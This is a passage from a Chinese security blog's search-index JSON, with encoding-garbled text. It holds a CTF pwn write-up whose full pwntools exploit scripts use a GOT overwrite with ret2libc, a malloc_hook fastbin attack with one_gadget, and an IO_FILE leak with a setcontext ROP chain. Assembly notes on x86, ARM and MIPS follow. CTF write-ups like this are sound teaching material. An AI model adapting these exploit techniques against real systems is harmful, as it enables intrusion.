(myts2.cn)](https://myts2.cn/2020/05/24/guan-yu-fasterde-na-xie-shi/)\n\n[[åŸåˆ›\\]ç¬¦å·æ‰§è¡Œåœ¨è‡ªåŠ¨åŒ–Pwnä¸­çš„ç®€å•åˆ©ç”¨-Pwn-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com](https://bbs.pediy.com/thread-266757.htm)\n\n[shellphish/driller: Driller: augmenting AFL with symbolic execution! (github.com)](https://github.com/shellphish/driller)\n","tags":["Angr"],"categories":["Reverse","Angr"]},{"title":"é™‡åŸæˆ˜ç–«WP","url":"/2021/11/08/é™‡åŸæˆ˜ç–«/","content":"\n# å‰è¨€\n\né¢˜çš„è´¨é‡éƒ½æŒºä¸é”™çš„\n\n# ä¸€ã€bbbay\n\nç­¾åˆ°é¢˜ï¼Œä»»æ„åœ°å€å†™8å­—èŠ‚ï¼Œæ”¹`___stack_chk_fail`å‡½æ•°gotè¡¨ä¸ºputs_pltå‡½æ•°ï¼Œåˆ å»canaryçš„ä¿æŠ¤ï¼Œç„¶åæ ˆæº¢å‡ºæ³„éœ²åœ°å€è¿”å›starté‡æ–°å¼€å§‹ï¼Œä¹‹åå†æ ˆæº¢å‡ºret2Libcæ¥getshellã€‚\n\n```python\n# -*- coding:UTF-8 -*-\n\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./pwn1\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s) \nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\n\n#libcsearcher use\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node4.buuoj.cn\",29806)\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\ndef dockerDbg():\n    myGdb = remote(\"127.0.0.1\",30001)\n    myGdb.close()\n    pause()\n#b *$rebase(0xdbd)\n\ndef func1(size,con):\n    sla(\"your choice\\n\",str(1))\n    sla(\"size:\\n\",str(size))\n    sa(\"content:\\n\",con)\n\ndef func0(addr,con):\n    sla(\"your choice\\n\",str(0))\n    sla(\"address:\\n\",addr)\n    sa(\"content:\\n\",con)\n\nputs_got = 0x601018\nputs_plt = 0x4005F0\n__stack_chk_fail_got = 0x601020\npop_rdi_ret = 0x0000000000400a03\nret = pop_rdi_ret + 1\nstart_addr = 0x400670\n\npayload = \"\"\npayload += \"A\"*(0x110+0x8)\npayload += p64(pop_rdi_ret)\npayload += p64(puts_got)\npayload += p64(puts_plt)\npayload += p64(start_addr)\n\n\nfunc0(str(__stack_chk_fail_got),p64(puts_plt))\n\nfunc1(len(payload),payload)\nsl(\"2\")\nputs_addr = u64Leakbase(0)\nobj = LibcSearcher(\"puts\", puts_addr)\nlibc_base = puts_addr-obj.dump('puts')\nsystem_addr = libc_base + obj.dump(\"system\")        #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\n\npayload = \"\"\npayload += \"A\"*(0x110+0x8)\npayload += p64(pop_rdi_ret)\npayload += p64(binsh_addr)\npayload += p64(system_addr)\npayload += p64(start_addr)\nfunc1(len(payload),payload)\nsl(\"2\")\nit()\n```\n\n\n\n# äºŒã€magic\n\nè¯´å®è¯è¿™é¢˜é€†å‘æ²¡å¤ªçœ‹æ‡‚ï¼Œé€†åŠå¤©æ²¡é€†å‡ºæ¥ä¸ªå•¥ï¼Œè¿˜å¾—å¥½å¥½å­¦å­¦é€†å‘ï¼Œæ˜¯å­¦é•¿åšçš„ï¼Œä¸è¿‡é€†å‘å®Œäº‹æ®è¯´æŒºç®€å•çš„ï¼Œç›´æ¥è´´ä¸‹å­¦é•¿expå§ã€‚\n\n```python\n# coding=utf-8\n\nfrom pwn import *\nimport sys\n\nbinary = \"./Magic\"\ncontext.log_level = \"debug\"\ncontext.arch = \"amd64\"\nelf = ELF(binary)\nglobal p\n\nlocal = 0\n\nif local:\n    p = process(binary)\n    # libc = elf.libc\n    # libc = ELF(\"/glibc/x64/2.27/lib/libc-2.27.so\")\n    # p = process(binary, env={'LD_PRELOAD':'/home/mtb0tx/share/ctf-pwn/libc/libc-2.27.so'})\n    # libc = ELF(\"./libc.so.6\")\n    libc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\")\n    # libc = ELF(\"/home/mtb0tx/share/ctf-pwn/libc/libc-2.27.so\")\n    # libc = ELF(\"/lib/i386-linux-gnu/libc.so.6\")\nelse:\n    host = \"node4.buuoj.cn\"\n    port = 28077\n    p = remote(host, port)\n    # libc = ELF(\"/home/mtb0tx/share/ctf-pwn/libc/libc-2.27.so\")\n    libc = ELF(\"./libc-2.23.so\")\n\ndef dbg():\n    sleep(0.5)\n    gdb.attach(p)\n    pause()\n\ndef gdb_a(addr):\n    gdb.attach(p, \"b *{0} \\n c\".format(addr))\n    pause()\n\ndef gdb_b(addr):\n    gdb.attach(p, \"b *$rebase({0}) \\n c\".format(addr))\n    pause()\n\nse      = lambda data               :p.send(data) \nsa      = lambda delim,data         :p.sendafter(delim, data)\nsl      = lambda data               :p.sendline(data)\nsla     = lambda delim,data         :p.sendlineafter(delim, data)\nrc      = lambda num                :p.recv(num)\nrl      = lambda                    :p.recvline()\nru      = lambda delims             :p.recvuntil(delims)\nuu32    = lambda data               :u32(data.ljust(4, '\\x00'))   \nuu64    = lambda data               :u64(data.ljust(8, '\\x00'))\nl64     = lambda                    :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,\"\\x00\"))\nl32     = lambda                    :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,\"\\x00\"))\nli      = lambda tag, addr          :log.info(tag + \" -> \" + hex(addr))\nia      = lambda                    :p.interactive()\n\nmenu = \"Input your choice: \"\n\ndef add(a, idx, b):\n    sla(menu,'1')\n    sl(str(a))\n    sla('Input the idx',str(idx))\n    sl(str(b))\n\ndef magic(a, idx, b, magic):\n    sla(menu,'2')\n    sl(str(a))\n    sla('Input the idx',str(idx))\n    sl(str(b))\n    sla(\"Input the Magic\", magic)\n\ndef delete(a, idx, b):\n    sla(menu,'3')\n    sl(str(a))\n    sla('Input the idx',str(idx))\n    sl(str(b))\n\n\nmalloc_hook_s = libc.symbols['__malloc_hook']\nfree_hook_s = libc.symbols['__free_hook']\n\nadd(1, 0, 1)\nmagic(1, 0, 1, \"a\"*8)\nru(\"a\"*8)\nmain_arena_xx = l64()\nmalloc_hook_addr = (main_arena_xx & 0xfffffffffffff000) + (malloc_hook_s & 0xfff)\nlibc_base = malloc_hook_addr - malloc_hook_s\nfree_hook_addr = libc_base + free_hook_s\nsystem = libc_base + libc.sym['system']\nli(\"libc_base\", libc_base)\ndelete(1, 0, 1)\nmagic(1, 0, 1, p64(malloc_hook_addr - 0x23))\nadd(1, 1, 1)\nadd(0, 0, 0)\n\n'''\n0x45226 execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  rax == NULL\n\n0x4527a execve(\"/bin/sh\", rsp+0x30, environ)\nconstraints:\n  [rsp+0x30] == NULL\n\n0xf03a4 execve(\"/bin/sh\", rsp+0x50, environ)\nconstraints:\n  [rsp+0x50] == NULL\n\n0xf1247 execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n'''\n\npl = '\\x00' * 0x13 + p64(libc_base + 0xf03a4)\nmagic(0, 0, 0, pl)\n\n# add(1, 1, 0)\n\ndelete(1, 1, 1)\ndelete(1, 1, 1)\n\n# dbg()\n\nia()\n```\n\n# ä¸‰ã€h3apclass\n\nè¿™é¢˜è¿˜ä¸é”™å•Šï¼Œæœ‰æ§åˆ¶æº¢å‡ºçš„æƒ³æ³•ï¼Œä¹Ÿæœ‰æ²™ç®±ä¿æŠ¤ï¼ŒåŠ«æŒIOã€‚ä¸è¿‡æ¯”èµ›æ—¶å¹²å…¶ä»–å»äº†ï¼Œæ²¡æ€ä¹ˆåšï¼Œæœ€åçœ‹äº†çœ‹è§‰å¾—èƒ½åšï¼Œä½†æ˜¯æ—¶é—´å·²ç»ä¸å¤Ÿäº†ï¼Œè¿™é‡Œç®€å•å¤ç°ä¸€ä¸‹ã€‚\n\nå…¶å®éš¾åº¦ä¹Ÿä¸å¤§ï¼Œæœ‰å‡ ä¸ªç‚¹\n\n1.æº¢å‡ºé™åˆ¶\n\nå°±æ˜¯å †æº¢å‡ºçš„æ—¶å€™ç”¨çš„æ˜¯strlen()æ¥è·å–sizeçš„ï¼Œè¿™æ ·éœ€è¦æŠŠå †ä¸­çš„å†…å®¹å¡«æ»¡ï¼Œæ‰èƒ½æº¢å‡ºåˆ°sizeä½ã€‚\n\n2.editçš„æŠ€å·§\n\nç„¶ååæœŸä¿®æ”¹çš„æ—¶å€™ï¼Œç”±äºéœ€è¦æ”¹fdæŒ‡é’ˆï¼Œé€šå¸¸ç”¨p64(addr)æ¥ä¿®æ”¹å˜›ï¼Œä½†æ˜¯è¿™é‡Œç”±äºstrlen()çš„å…³ç³»ï¼Œåªèƒ½å‘é€6ä¸ªå­—èŠ‚ï¼Œå¤šå‡ºæ¥çš„\\x00ä¸è¦å‘é€ï¼Œä¸ç„¶è¾“å…¥è¾“å‡ºå®¹æ˜“å¯¹ä¸ä¸Šï¼Œå¯¼è‡´ç¨‹åºå‡ºé”™ã€‚\n\n3.æ³„éœ²åœ°å€çš„æŠ€å·§\n\nåŠ«æŒIOï¼Œä½†æ˜¯2.31ä¸‹éœ€è¦æˆ‘ä»¬æ³„éœ²å †åœ°å€å®ŒæˆORWåŠ«æŒï¼Œæ‰€ä»¥æŠŠIO_write_baseæ”¹ä¸ºmain_arena+96å¤„ï¼Œæ³„éœ²å †åœ°å€å’Œlibcï¼Œä¸è¿‡è¿™æ ·å‘é€çš„æ•°æ®é‡ä¼šæ¯”è¾ƒå¤§ï¼Œå»ºè®®ç”¨sleep(2)æ¥ç»™ç¨‹åºä¸€å®šçš„ç¼“å†²æ—¶é—´ã€‚\n\n4.çˆ†ç ´ï¼Œç”±äºæ²¡æœ‰æ³„éœ²ï¼ŒåŠ«æŒIOåªèƒ½ç”¨çˆ†ç ´libcçš„æ–¹å¼æ¥è§£å†³ï¼Œä¸è¿‡ä¹Ÿåªæ˜¯1/16çš„æ¦‚ç‡ï¼Œè¿˜æ˜¯å¾ˆå¥½å‘½ä¸­çš„ã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./H3apClass\"\ncontext.binary = binary\nlibc = ELF('/lib/x86_64-linux-gnu/libc.so.6')\n#elf = ELF(binary)\ncontext.timeout = 0.2\n\nglobal p\n\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\nmenu = \"4:Drop homework\\n\"\nmenu_n = \"4:Drop homework\"\n\ndef dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n\tmyGdb.close()\n\tpause()\n#b *$rebase(0xdbd)\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n    \ndef gdb_b(addr):\n    gdb.attach(p, \"b *$rebase({0}) \\n c\".format(addr))\n    sleep(0.5)\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\ndef add(idx,size,con):\n    sla(menu, \"1\")\n    sla(\"Which homework?\\n\", str(idx))\n    sla(\"size:\\n\", str(size))\n    sa(\"content:\\n\",con)\n\ndef add_n(idx,size,con):\n    sla(menu_n, \"1\")\n    sla(\"Which homework?\", str(idx))\n    sla(\"size:\", str(size))\n    sa(\"content:\",con)\n\ndef delete(idx):\n    sla(menu, \"4\")\n    sla(\"Which homework?\\n\", str(idx))\n\ndef delete_n(idx):\n    sla(menu_n, \"4\")\n    sla(\"Which homework?\", str(idx))\n\n# def show(idx):\n#     sla(menu, \"3\")\n#     sla(\"I:>>\\n\", str(idx))\n\ndef edit(idx,con):\n    sla(menu, \"3\")\n    sla(\"Which homework?\\n\", str(idx))\n    sa(\"content:\\n\",con)\n\ndef edit_n(idx,con):\n    sla(menu_n, \"3\")\n    sla(\"Which homework?\", str(idx))\n    sa(\"content:\",con)\n\ndef pwn():\n\tguess_libc=0x0000\n\tguess_IO = guess_libc + libc.sym['_IO_2_1_stdout_']\n\tguess_main = guess_libc + libc.sym['__malloc_hook'] + 0x10\n\n\tadd(0,0xf8,'A'*0xf8)\n\tadd(1,0xf8,'A'*0xf8)\n\tadd(2,0xf8,'A'*0xf8)\n\tadd(3,0xf8,'A'*0xf8)\n\tadd(4,0xf8,'A'*0xf8)\n\tadd(5,0xf8,'A'*0xf8)\n\tadd(6,0xf8,'A'*0xf8)\n\tedit(0,'A'*0xf8+p16(0x501))\n\tdelete(5)\n\tdelete(4)\n\tdelete(3)\n\tdelete(2)\n\tdelete(1)\n\tadd(1,0x78,'\\x00')\n\tadd(2,0x78,'\\x00')\n\tadd(3,0x78,p16((guess_IO)&0xffff))\n\tadd(4,0xf8,'\\x00')\n\t#dockerDbg()\n\tfd = 0x00000000fbad2887\n\tadd(5,0xf8,p64(0xfbad1800) + p64(0)*3 + p16((guess_main+96)&0xffff))\n\theap_base = uu64(rc(6)) - 0x0019a0\n\tlibc_base = u64Leakbase(0x1ebbf0)\n\n\tlg(\"libc_base\",libc_base)\n\tlg(\"heap_base\",heap_base)\n\tfree_hook = libc_base + libc.sym['__free_hook']\n\tsetcontext61 = libc_base + libc.sym['setcontext'] + 61\n\tlg(\"free_hook\",free_hook)\n\tgadget = libc_base + 0x154930\n\t#dockerDbg()\n\t#dockerDbg()\n\tdelete_n(1)\n\tdelete_n(2)\n\tdelete_n(3)\n\tedit_n(4,p32(free_hook&0xffffffff)+p16(free_hook>>32))\n\t#dockerDbg()\n\tadd_n(1,0x78,'A'*0x78)\n\tadd_n(2,0xe8,'A'*0xe8)\n\tchunk1_addr = heap_base + 0x0014b0\n\tlg(\"chunk1_addr\",chunk1_addr)\n\tadd_n(3,0x78,p64(gadget))\n\n\n\tpop_rdx_r12_ret = libc_base + 0x000000000011c371\n\tpop_rsi_ret = libc_base + 0x0000000000027529 \n\tpop_rdi_ret = libc_base + 0x0000000000026b72\n\tpop_rax_ret = libc_base + 0x000000000004a550\n\tsyscall_ret = libc_base + 0x0000000000066229\n\tret = pop_rdi_ret + 1\n\tOpen = libc_base + libc.sym['open']\n\tRead = libc_base + libc.sym['read']\n\tPuts = libc_base + libc.sym['puts']\n\n\n\tchunk_addr = chunk1_addr\n\tfake_rsp = chunk_addr + 0xb0 + 0x10\n\tflag = chunk_addr + 0xb0 \n\torw = \"a\"*0x08 + p64(chunk_addr) \n\torw += \"a\"*0x10 \n\torw += p64(libc_base + libc.sym['setcontext'] + 61) + \"a\"*0x8\n\torw += \"a\"*0x70\n\torw += p64(fake_rsp) + p64(ret)\n\torw += './flag\\x00\\x00'\n\torw += p64(0)\n\torw += p64(pop_rdi_ret) + p64(flag)\n\torw += p64(pop_rsi_ret) + p64(0)\n\torw += p64(pop_rax_ret) + p64(2)\n\torw += p64(syscall_ret)\n\torw += p64(pop_rdi_ret) + p64(3)\n\torw += p64(pop_rsi_ret) + p64(fake_rsp+0x200)\n\torw += p64(pop_rdx_r12_ret) + p64(0x30) + p64(0x0)\n\torw += p64(libc_base+libc.sym['read'])\n\torw += p64(pop_rdi_ret) + p64(1)\n\torw += p64(libc_base+libc.sym['write'])\n\tedit_n(1,orw[0:0x70])\n\tedit_n(2,orw[0x80:])\n\t#dockerDbg()\n\tdelete_n(1)\n\tit()\n\n\n\n\n\ni = 0\nwhile True:\n    i += 1\n    log.info(\"Times:%d\"%i)\n    try:\n    \t#p = remote(\"172.20.2.7\",\"26351\")\n        p = process(\"./H3apClass\")\n        pwn()\n    except EOFError:\n        p.close()\n        continue\n    except Exception:\n        p.close()\n        continue\n    else:\n        p.interactive()\n        break\n```\n\næœ€åçš„httpdæ²¡çœ‹ï¼Œåé¢å†è¯´æŠŠã€‚\n","tags":["æ¯”èµ›"],"categories":["æ¯”èµ›"]},{"title":"æ±‡ç¼–åŸºç¡€","url":"/2021/11/02/æ±‡ç¼–/","content":"\n\n\n# å‰è¨€\n\nå¤ä¹ ä¸€ä¸‹æ±‡ç¼–\n\n# ä¸€ã€X86\n\n## 1.æ±‡ç¼–æŒ‡ä»¤\n\n### (1)è·³è½¬\n\nä¾æ®ZF(Zero)ã€SF(Symbol))ã€OF(Overflow)ã€PF(Parity)ã€CF(Carry)äº”ç§çŠ¶æ€æ ‡å¿—ä½æœ‰å¯¹åº”çš„è·³è½¬JZ(JNZ)/JS(JNS)ç­‰äº”ç§è·³è½¬\n\nçŠ¶æ€æ ‡å¿—ä½é™¤äº†ä»¥ä¸Šäº”ç§è¿˜æœ‰AF(Assistant)è¾…åŠ©è¿›ä½\n\næ­¤å¤–è¿˜æœ‰Jmpæ— æ¡ä»¶è·³è½¬\n\n### (2)æ ‡å¿—ä½\n\nä»¥ä¸Šçš„å…­ç§çŠ¶æ€æ ‡å¿—ä½å¤–ï¼Œè¿˜æœ‰ä»¥ä¸‹ä¸‰ç§æ ‡å¿—ä½\n\nTF(trap):è·Ÿè¸ªæ ‡ç­”å¿—ä½ï¼šå•æ­¥æ ‡å¿—\n\nIF(interregnum):ä¸­æ–­æ ‡å¿—ä½\n\nDF(direction):æ–¹å‘æ ‡å¿—ä½\n\n\n\n## 2.å¯„å­˜å™¨\n\n### (1)ä¼ å‚\n\n64ä½ï¼šrdi  rsi  rdx  rcx r8 r9 æ ˆ\n\n32ä½ï¼šæ ˆä¼ å‚\n\n### (2)æ ˆæŒ‡é’ˆ\n\nRSPã€RBP\n\n\n\n# äºŒã€ARM\n\n## 1.å¯„å­˜å™¨å…³ç³»\n\n![32](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211103145318.png)\n\n- R0~R3ï¼šå‡½æ•°è°ƒç”¨å‚æ•°ï¼Œä»£è¡¨ç¬¬0~4ä¸ªå‚æ•°ï¼Œå‰©ä¸‹çš„å‚æ•°ä»å³å‘å·¦ä¾æ¬¡å…¥æ ˆï¼Œå‡½æ•°è¿”å›å€¼ä¿å­˜åœ¨R0ä¸­ã€‚(å¯¹åº”åœ¨aarch64ä¸­ä¸ºR0~R7ï¼Œä½†æ˜¯gdbè°ƒè¯•æˆ–è€…IDAä¸­ä¸€èˆ¬æ˜¾ç¤ºX0~X30ï¼ŒåŒæ—¶è¿˜æœ‰ä½32ä½çš„W0~W30)\n\n- SPï¼šç±»ä¼¼rsp,espï¼Œæ ˆæŒ‡é’ˆ\n\n- FPï¼šç±»ä¼¼ebpï¼Œæ ˆæŒ‡é’ˆ\n- LRï¼šå½“å‘ç”Ÿå‡½æ•°è°ƒç”¨æ—¶ï¼Œä¼šä¿å­˜è°ƒç”¨å‡½æ•°å¤„çš„åœ°å€ï¼Œé€€å‡ºå‡½æ•°æ—¶èµ‹å€¼ç»™PCã€‚\n\n- PCï¼šç±»ä¼¼eip,ripï¼Œå­˜å‚¨ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚\n\n- R11ï¼šç±»ä¼¼ebpï¼Œæ ˆæŒ‡é’ˆï¼Œå…¶å®å°±å·®ä¸å¤šæ˜¯FP\n\n## 2.æ±‡ç¼–æŒ‡ä»¤\n\n### (1)å¯„å­˜å™¨ä¼ é€MOV\n\nå¯„å­˜å™¨ä¹‹é—´è¿˜æ˜¯MOVæŒ‡ä»¤ï¼Œæ¯”å¦‚MOV R2,R0;ä½†æ˜¯å¦‚æœæ¶‰åŠåˆ°å†…å­˜ä¸Šçš„ï¼Œåˆ™éœ€è¦å…ˆåŠ è½½åˆ°å¯„å­˜å™¨ä¸­ï¼Œæˆ–è€…æŠŠå¯„å­˜å™¨ä¸­çš„å€¼å­˜å‚¨åˆ°å†…å­˜ä¸­\n\n### (2)å¯„å­˜å™¨-å†…å­˜ä¼ é€\n\nSTR(store reg)/LDR(load reg)ä»¥åŠSTM(store multiple)/LDM(load multiple)\n\n#### â‘ STR/LDRæ¨¡å¼\n\n##### STR Ra [Rb]ï¼š\n\nRaä¸­çš„æ•°æ®å­˜å‚¨åˆ°RbæŒ‡å‘çš„å†…å­˜ä¸­\n\n##### LDR Ra [Rb]\n\nRbæŒ‡å‘çš„å†…å­˜ä¸­çš„å€¼åŠ è½½åˆ°Raä¸­\n\næ­¤å¤–è¿˜æœ‰å¦‚ä¸‹æƒ…å½¢\n\n```\nSTR  R0,[R1, #12]  // R0 --> [R1+12]\nLDR  R4,[R5, R6]  // R4 <-- [R5+R6]\n```\n\n\n\n#### â‘¡STM/LDMæ¨¡å¼\n\n##### STM R0, {R4,R5}\n\nR4çš„å€¼ä¼ é€ç»™R0+xå¯¹åº”çš„å†…å­˜å•å…ƒï¼Œç„¶åR5çš„å€¼ä¼ ç»™R0+x+xå¯¹åº”çš„å†…å­˜å•å…ƒ\n\nè¿™ä¸ªxå³ç”±åç¼€å†³å®šï¼Œåˆ†åˆ«æœ‰ä»¥ä¸‹å‡ ç§\n\n- DB(Decrease Before)ï¼šæ¯æ¬¡ä¼ é€å‰R0åŠ ä¸Šxï¼Œxä¸ºè´Ÿæ•°\n\n- DA(Decrease After)ï¼šæ¯æ¬¡ä¼ é€åR0åŠ ä¸Šxï¼Œxä¸ºè´Ÿæ•°\n\n- IB(Increase Before)ï¼šæ¯æ¬¡ä¼ é€å‰R0åŠ ä¸Šxï¼Œxä¸ºæ­£æ•°\n- IA(Increase After)ï¼šæ¯æ¬¡ä¼ é€åR0åŠ ä¸Šxï¼Œxä¸ºæ­£æ•°\n\nè€ŒXåˆ™åœ¨ä¸åŒçš„CPUä½æ•°ä¸‹ä¸åŒï¼Œ32ä¸º4ï¼Œ64åˆ™ä¸º8ã€‚\n\næ­¤å¤–å †æ ˆçš„å¢é•¿æ–¹å‘å¯ä»¥ä¸åŒï¼Œä¹Ÿå¯ä»¥åœ¨ä¸åŒæƒ…å½¢ä¸‹ä½œä¸ºåç¼€ï¼Œæ•ˆæœä¸€æ ·çš„\n\n- FD(Full Descent)ï¼šæ»¡é€’å‡å †æ ˆ\n- FA(Full Ascent)ï¼šæ»¡é€’å¢å †æ ˆ\n- ED(Empty Descent)ï¼šç©ºé€’å‡å †æ ˆ\n- EA(Empty Ascent)ï¼šç©ºé€’å¢å †æ ˆ\n\næ»¡åˆ™ä»£è¡¨æ ˆæŒ‡é’ˆæŒ‡å‘æ ˆé¡¶ï¼Œç©ºåˆ™ä»£è¡¨æ ˆæŒ‡é’ˆä¸æŒ‡å‘æ ˆé¡¶\n\n\n\n### (3)è·³è½¬æŒ‡ä»¤\n\n#### â‘ åˆ†æ”¯è·³è½¬(Branch)\n\n##### B\n\næ— æ¡ä»¶è·³è½¬\n\n##### BX \\<Rm\\>\n\nç”±å¯„å­˜å™¨ç»™å‡ºåœ°å€\n\nè‹¥ Rm çš„ bit[0] ä¸º1ï¼Œåˆ‡æ¢åˆ° Thumb æŒ‡ä»¤æ‰§è¡Œï¼›\n\nè‹¥ Rm çš„ bit[0] ä¸º0ï¼Œåˆ‡æ¢åˆ° ARM æŒ‡ä»¤æ‰§è¡Œã€‚\n\n##### BL\n\nç±»ä¼¼äºCallï¼Œä¼šå­˜å…¥è¿”å›åœ°å€åˆ°LRå¯„å­˜å™¨\n\n##### BLX/BLR\n\nå³ç±»ä¼¼å¯¹åº”ç»„åˆ\n\n#### â‘¡æ¡ä»¶è·³è½¬\n\nä¾æ®CPSRå¯„å­˜å™¨ä¸‹çš„ALUçŠ¶æ€æ ‡å¿—ä½\n\nCPSRå¯„å­˜å™¨åŒ…å«ä¸‹é¢çš„ALUçŠ¶æ€æ ‡å¿—ï¼š\n\nã€€ã€€Nã€€ Set when the result of the operation was Negative(ç»“æœä¸ºè´Ÿæ•°)\n\nã€€ã€€Z\tSet when the result of the operation was Zero(ç»“æœä¸º0)\n\nã€€ã€€C\tSet when the operation result in a Carry(å‘ç”Ÿè¿›ä½ï¼Œæˆ–å€Ÿä½)\n\nã€€ã€€V\tSet when the operation caused oVerflow(æ“ä½œé€ æˆæº¢å‡º)\n\nã€€ã€€Q\tARM architecture v5E only sticky flag\n\nè¿˜æœ‰BEQã€BNE\n\n\n\n\n\n# ä¸‰ã€MIPS\n\nä¸»è¦ä»‹ç»mipselæ¶æ„çš„ï¼Œå°ç«¯åºï¼Œå¤§ç«¯çš„mipså¾ˆå°‘è€ƒåˆ°ï¼Œè€Œä¸”ä¹ŸåŸºæœ¬éƒ½æ˜¯å¤§åŒå°å¼‚\n\n## 1.å¯„å­˜å™¨å…³ç³»\n\n| REGISTER | NAME      | USAGE                                                        |\n| :------- | :-------- | :----------------------------------------------------------- |\n| $0       | $zero     | å¸¸é‡0(constant value 0)                                      |\n| $1       | $at       | ä¿ç•™ç»™æ±‡ç¼–å™¨(Reserved for assembler)                         |\n| $2-$3    | $v0 - $v1 | å‡½æ•°è°ƒç”¨è¿”å›å€¼(values for results and expression evaluation) |\n| $4-$7    | $a0-$a3   | å‡½æ•°è°ƒç”¨å‚æ•°(arguments)                                      |\n| $8-$15   | $t0-$t7   | æš‚æ—¶çš„(æˆ–éšä¾¿ç”¨çš„)                                           |\n| $16-$23  | $s0-$s7   | ä¿å­˜çš„(æˆ–å¦‚æœç”¨ï¼Œéœ€è¦SAVE/RESTOREçš„)(saved)                  |\n| $24-$25  | $t8-$t9   | æš‚æ—¶çš„(æˆ–éšä¾¿ç”¨çš„)                                           |\n| $28      | $gp       | å…¨å±€æŒ‡é’ˆ(Global Pointer)                                     |\n| $29      | $sp       | å †æ ˆæŒ‡é’ˆ(Stack Pointer)                                      |\n| $30      | $fp       | å¸§æŒ‡é’ˆ(Frame Pointer)                                        |\n\nè¯´æ˜\n\n- $0\n\nå³$zero,è¯¥å¯„å­˜å™¨æ€»æ˜¯è¿”å›é›¶ï¼Œä¸º0è¿™ä¸ªæœ‰ç”¨å¸¸æ•°æä¾›äº†ä¸€ä¸ªç®€æ´çš„ç¼–ç å½¢å¼ã€‚\n\n```mipsasm\nmove $t0,$t1\n#å®é™…ä¸º  \nadd $t0,$0,$t1\n```\n\nä½¿ç”¨ä¼ªæŒ‡ä»¤å¯ä»¥ç®€åŒ–ä»»åŠ¡ï¼Œæ±‡ç¼–ç¨‹åºæä¾›äº†æ¯”ç¡¬ä»¶æ›´ä¸°å¯Œçš„æŒ‡ä»¤é›†ã€‚\n\n- $1\n\nå³ $atï¼Œè¯¥å¯„å­˜å™¨ä¸ºæ±‡ç¼–ä¿ç•™ï¼Œç”±äºIå‹æŒ‡ä»¤çš„ç«‹å³æ•°å­—æ®µåªæœ‰16ä½ï¼Œåœ¨åŠ è½½å¤§å¸¸æ•°æ—¶ï¼Œç¼–è¯‘å™¨æˆ–æ±‡ç¼–ç¨‹åºéœ€è¦æŠŠå¤§å¸¸æ•°æ‹†å¼€ï¼Œç„¶åé‡æ–°ç»„åˆåˆ°å¯„å­˜å™¨é‡Œã€‚æ¯”å¦‚åŠ è½½ä¸€ä¸ª32ä½ç«‹å³æ•°éœ€è¦ `lui`ï¼ˆè£…å…¥é«˜ä½ç«‹å³æ•°ï¼‰å’Œ`addi`ä¸¤æ¡æŒ‡ä»¤ã€‚åƒMIPSç¨‹åºæ‹†æ•£å’Œé‡è£…å¤§å¸¸æ•°ç”±æ±‡ç¼–ç¨‹åºæ¥å®Œæˆï¼Œæ±‡ç¼–ç¨‹åºå¿…éœ€ä¸€ä¸ªä¸´æ—¶å¯„å­˜å™¨æ¥é‡ç»„å¤§å¸¸æ•°ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºæ±‡ç¼–ä¿ç•™$atçš„åŸå› 